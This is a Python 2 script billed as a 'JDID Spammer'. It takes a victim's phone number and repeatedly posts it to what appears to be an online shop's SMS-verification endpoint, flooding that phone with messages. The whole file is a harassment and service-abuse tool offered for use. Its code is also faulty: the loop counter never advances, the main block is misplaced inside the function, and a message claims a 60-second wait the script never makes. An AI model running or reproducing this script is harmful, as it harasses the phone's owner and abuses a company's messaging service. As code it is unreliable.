import requests
import time
import sys
baner = '''
| JDID Spammer
| Creator: thePriVat
| Github: github.com/theprivat
'''
def jdid():
	try:
		options = sys.argv[1]
		phone = sys.argv[2]
		if sys.argv[1] == "--phone":
			print baner
			privat = {'phone': ''+sys.argv[2], 'smsType': '1'}
			x = 0
			while (x < 100):
				loncat = 'http://sc.jd.id/phone/sendPhoneSms'
				pak = requests.post(loncat, data=privat)
				cat = pak.text
				if "true" in cat:
					print ' \033[1;32m[  OK  ] Send Succesful...Sleep for 1 second...\033[0m'
				else:
					print '\033[1;31m[FAILED] Send Failed...Sleep for 60 second...\033[0m'
				time.sleep(1)
				y = x + 1
			print("\033[1;33m[ DONE ] Stopped...\033[0m")
			sys.exit(1)
		else:
			print baner
			print 'Usage: jdid.py --phone [nomor]'
			print "lite.py: error: %s option requires an argument" %options
			sys.exit()
	if __name__ == '__main__':
		if len(sys.argv) != 3:
			print baner
			print "Usage: jdid.py --phone [nomor]"
			sys.exit(0)
		else:
			jdid()
	except KeyboardInterrupt:
		print 'CTRL + C: Stoped To Progam'
